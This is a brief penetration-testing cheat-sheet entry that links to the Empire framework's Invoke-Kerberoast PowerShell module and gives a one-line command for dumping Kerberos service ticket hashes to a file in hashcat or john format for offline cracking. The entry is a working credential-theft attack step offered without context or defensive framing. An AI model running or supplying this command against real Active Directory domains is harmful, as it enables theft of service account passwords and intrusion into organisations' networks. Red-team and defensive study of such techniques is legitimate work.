### Source
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1  

### Kerberoast
```
Invoke-Kerberoast -OutputFormat &lt;[hashcat|john]&gt; | % { $_.Hash } | Out-File -Encoding utf8 &lt;file&gt;
```


